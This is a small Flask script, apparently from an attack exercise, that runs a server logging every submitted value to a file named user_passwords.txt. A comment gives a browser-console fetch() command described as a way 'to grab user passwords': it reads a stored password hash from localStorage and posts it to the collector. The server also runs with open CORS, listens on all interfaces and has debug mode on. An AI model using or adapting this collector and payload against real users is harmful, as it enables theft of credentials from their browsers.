from flask import Flask, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

@app.route('/', methods=['POST'])
def save_data():
    user_input = request.form.get('text_box', '')
    with open('./attack/Flask Server/user_passwords.txt', 'a') as f:
        f.write(user_input + '\n')
    return 'Data saved'

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)


# command to write in console tab to grab user passwords
# fetch('http://127.0.0.1:5000/', {
#   method: 'POST',
#   headers: {
#     'Content-Type': 'application/x-www-form-urlencoded'
#   },
#   body: `text_box=${encodeURIComponent(localStorage.getItem("secure_password_hash"))}`
# })